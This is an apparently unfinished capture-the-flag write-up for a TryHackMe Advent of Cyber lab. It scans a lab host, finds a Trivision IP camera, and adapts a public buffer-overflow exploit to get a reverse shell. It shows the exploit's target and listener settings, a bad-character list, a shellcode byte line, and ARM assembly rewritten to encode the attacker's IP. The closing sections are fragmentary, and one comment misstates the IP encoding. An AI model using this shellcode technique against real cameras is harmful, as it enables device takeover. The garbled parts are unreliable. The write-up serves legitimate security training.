# Snowy ARMageddon #
### https://tryhackme.com/room/armageddon2r ###

#  
### CONTENTS : ###
[TL;DR](#tldr-)

[PROCEDURE](#procedure-)

-  [Part 1 - Retrieving the WiFi SSID](#part-1---retrieving-the-wifi-ssid)
    
-  [Part 2 - Retrieving the WiFi Password](#part-2---retrieving-the-wifi-password)
    
-  [Part 3 - Decrypting and Analysing WiFi Traffic](#part-3---decrypting-and-analysing-wifi-traffic)
    
-  [Part 4 - Decrypting and Replaying a RDP Session](#part-4---decrypting-and-replaying-a-rdp-session)



### TL;DR : ###
-  R
#   

>Christmas 2023 is already just around the corner. The Bandit Yeti has been sleeping for most of the year to prepare to hack back into the Best Festival Company. Should he have used that time to plan his attack? Probably. But Yetis need a lot of energy, so don't judge!

This room was included as one of the sidequests for the TryHackMe Advent of Cyber 2023.  We are given [a network capture file; `VanSpy.pcapng`](assets/VanSpy.pcapng) and tasked with answering the following questions:

**NOTE :** Passwords, hashes and flags are redacted in this document.  If you'd like to know the answers simply go to the [TryHackMe Room](https://tryhackme.com/room/adv3nt0fdbopsjcap) and follow the steps - it's free 😄

>What is the content of the first flag?
>
>What is the content of the `yetikey2.txt` file?
>


## Procedure ##

Victim IP: `10.10.106.239`

Start with a `nmap` scan with the `-sS` switch and go have a coffee while it runs.
The `-sS` switch asks `nmap` to perform a `SYN Stealth scan` which is a relatively stealthy (remember that stealth is important in this challenge) and quick scan.  A `SYN Stealth scan` never opens a full TCP connection and instead relies on sending  `SYN` packets and waiting for a `SYN/ACK` or `RST` responses.



```
sudo nmap -sS -p1-65335 10.10.200.123
```
**_NOTE:_** You may also use `rustscan -a 10.10.106.239` which yields MUCH quicker portscan results - but honestly I don't know how it compares to NMAP with -sS in terms of 'noisieness'.

```
Starting Nmap 7.60 ( https://nmap.org ) at 2024-01-15 09:02 GMT
Nmap scan report for ip-10-10-200-123.eu-west-1.compute.internal (10.10.200.123)
Host is up (0.00029s latency).

PORT      STATE SERVICE
22/tcp    open  ssh
23/tcp    open  telnet
8080/tcp  open  http-proxy
50628/tcp open  unknown
MAC Address: 02:5F:E1:66:EA:0B (Unknown)

```
From the scan results we can see four open ports:
  -  Port `22` for SHH
  - Port `23` for Telnet
  - Port `8080` (most probably a website)
  - Port `50628` - an unusual port number

Connecting via SSH is not possible and we get a `Permission denied (publickey)` error.   Attempting to connect via Telnet successfully establishes a connection which is immediately terminated by the host, and since we don't know anything about port `50628` so far, we're going to ignore it for the time being.

This leaves us with port `8080` and we can just open a browser and navigate to `http://10.10.200.123:8080/` to bring up a website with an angry-looking elf:

![angry-looking elf](https://private-user-images.githubusercontent.com/60655500/296706743-c385f64f-641c-4ecc-8a62-967f08084d7d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MDUzMTAwOTAsIm5iZiI6MTcwNTMwOTc5MCwicGF0aCI6Ii82MDY1NTUwMC8yOTY3MDY3NDMtYzM4NWY2NGYtNjQxYy00ZWNjLThhNjItOTY3ZjA4MDg0ZDdkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDAxMTUlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQwMTE1VDA5MDk1MFomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPWJkNjhhYjkyMTJiYTIzMGFkYjBjMTgzNzU2ODY2NGRjODRiZTRjMmZmZDhiZWI5MGZmNjU3MGNkY2FmNzJlMjcmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0JmFjdG9yX2lkPTAma2V5X2lkPTAmcmVwb19pZD0wIn0.2yZw1zeU49ni4BdVoZMqBM-GnLyi8Nx9KaTgKTmU94s)

This must be the **"internal-only web application"** that is our main target.  But as the name implies - it's only accessible from the internal network, so we need to figure out a way in first.

Let's have a look at port `50628` next - maybe we can access it through the browser too by navigating to `http://10.10.106.239:50628` ?  Yup, it brings up a login page for a **Trivision NC-227WF HD 720P** IP Network camera:

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/13c1fc4f-a870-44b9-80a0-f95748667583)

Some Google searching for `Trivision NC-227WF Exploit` quickly leads us to the following article: [(https://no-sec.net/arm-x-challenge-breaking-the-webs/)](https://no-sec.net/arm-x-challenge-breaking-the-webs/) and just by looking at the title it is evident that we're dealing with an ARM processor architecture (and the `ARMageddon` in the challenge title is making more sense now).
The article explains how a buffer overflow vulnerability in the Trivision camera firmware can be exploited to establish a reverse shell connection.  It conveniently also provides [assembly code instructions](code/Snowy_ARMageddon/original_assembly_instructions.asm) and a [python script](code/Snowy_ARMageddon/original_exploit.py) to exploit this.

The Python code includes the `HOST`, `LHOST` variables that need to be updated with the Camera IP address and Localhost IP address respectively. 
```
HOST = '10.10.106.239'
PORT = 50628
LHOST = [10,10,233,1]
LPORT = 4444
```

The code then declares a variable called `BADCHARS` - tis contains the hex values that we cannot pass on to the device.... these will come into play in a short while...
```
BADCHARS = b'\x00\x09\x0a\x0d\x20\x23\x26'
```

There is also a line towards the end of the script that needs to be updated with the IP Camera's address:
```
s = remote('10.10.106.239', 50628)
```

Now comes the interesting bit...  The Python script includes a block of code that passes assembly instructions in the form of hex byte strings.  This includes our machine's local IP address hard-coded into the hex byte strings which will be used to establish the reverse shell.  Luckily for us, the inline documentation conviently indicates which line is tackling this and we also have the assembly code corresponding to it:
```
SC += b'\x59\x1f\xa0\xe3\x01\x14\xa0\xe1\xa8\x10\x81\xe2\x01\x14\xa0\xe1\xc0\x10\x81\xe2\x04\x10\x2d\xe5'   # 192.168.100.1
```
```
/* ADDR */
mov r1, #0x164
lsl r1, #8
add r1, #0xa8
lsl r1, #8
add r1, #0xc0
push {r1}       // 192.168.100.1
```

If you're reading this and are anything like myself - you probably just experienced an involuntary inner *groan* at the site of assembly code...  but please stay with me for a while longer and I hope to demystify this code block for you.

First of all, we can use a Dis/Assembler like https://shell-storm.org/online/Online-Assembler-and-Disassembler/ to convert between assembly instructions and the equivalent hex values that represent it.  This tool will come in useful as we work out how to replace the hex byte string with one containing our local machine's IP address.  It is also worth keeping in mind that ARM uses a little-endian system which essentially means that the octets of the IP address are stored in reverse order, eg. `1.100.168.192`.

So what's going on with the assembly instructions storing the IP address value of `192.168.100.1`?:
-  Move 0x164 to register R1 (i.e. 356 in decimal)
-  Shift the register left by eight bits (i.e. perform 356 x 256 = 91136)
-  Add 0xA8 to R1 (i.e. perform 91136 + 168 = 91304)
-  Shift the register left by eight bits (i.e. perform 91304 x 256 = 23373824)
-  Add 0xC0 to R1 (i.e. perform 23373824 + 192 = **23374016**)

So now we have value of `23374016` (decimal) stored in register R1.  If we convert this to a 32-bit binary and divide into octets (i.e. groups of 8 bits each) we get: **`00000001.01100100.10101000.11000000`**, and if we convert this back to decimal we will get: **`1.100.168.192`** - which is the little-endian representation of the IP address we were looking to store.

If you've managed to follow my reasoning this far, it should be clear that we are taking the little-endian representation of the IP address, converting it to decimal and then storing appropriate hex values to register R1 to represent this.  In our case this is complicated a bit further by the fact that we have to avoid the hex values defined in the `BADCHARS` variable.

Now that we've understood how this works, we can craft our own hex byte string that points back to our local machine IP address - in our case this will be `10.10.233.1`.

```
/* ADDR */
mov r1, #0x01   // store '1' in R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0xe9   // add '233' to R1
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
add r1, #0x02
lsl r1, #8      // shift by 8 bits to the left
add r1, #0x08   // add '8' and '2' to R1 (since we cannot pass the hex value for 10; '0x0a'
add r1, #0x02
lsl r1, #8      // shift by 8 bits to the left
push {r1}       
```
Now we can simply copy this set of instructions to the assembler and convert it to a hex string we can paste into the Python Script:

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/5e6676c6-ed19-4ece-be39-ce287b633105)



#  
#  
#  
```
21      /* ADDR */
22      mov r1, #0xEC       ; Move 0xEC into register r1 (0x0A * 256 + 0xEC = 10.10)
23      lsl r1, #8          ; Left shift r1 by 8 bits
24      add r1, #0x0A       ; Add 0x0A to r1 (0xEC0A = 10.10 in little-endian)
25      lsl r1, #8          ; Left shift r1 by 8 bits
26      add r1, #0x03       ; Add 0x03 to r1 (0x0AEC03 = 10.10.236.3 in little-endian)
27      push {r1}           ; Push the value in r1 onto the stack (little-endian)
```

![image](https://github.com/beta-j/TryHackMe-Rooms/assets/60655500/dbffc18e-c759-424f-a818-9afc521d082f)


```
 mov r1, #0xdc      <==== 220
 lsl r1, #8         <==== shift 8 bits left           
 add r1, #0x42      <=== 66
 lsl r1, #8
 add r1, #0x08      <=== 8 +
 add r1, #0x02      <=== 2 = 10
 lsl r1, #8
 add r1, #0x08
 add r1, #0x02
push {r1}

```

<!--stackedit_data:
eyJoaXN0b3J5IjpbLTExMzkyMzM1MiwtNDIyMzQ1OTI2LC0xMj
A2MDY3NDE0XX0=
-->
